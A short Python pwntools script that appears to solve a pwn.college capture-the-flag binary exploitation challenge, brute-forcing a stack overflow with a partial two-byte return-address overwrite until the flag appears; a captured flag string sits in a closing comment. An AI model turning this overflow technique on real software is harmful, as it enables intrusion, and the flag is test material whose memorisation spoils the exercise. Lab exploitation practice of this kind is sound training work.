#!/usr/bin/env python3
from pwn import *

context.terminal = ['kitty', '-e']

exe = context.binary = ELF('./binary-exploitation-null-write-w', checksec=False)
libc = exe.libc

gdbscript = '''

'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            pause()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

p = start()


offset = 72
for i in range(1000):
    p = exe.process()

    payload = flat(
        b'\x00' + b'A' * (offset - 1),
        p16(0x62b5)
    )

    p.send(payload)

    output = p.recvall().decode()
    print(output)
    if ("kms{" in output):
        print(output)
        break

p.interactive()
#pwn.college{8-i36_t6Y2E4r0DJkg1ZgQXDWLr.dNDMzwCMxADNwEzW}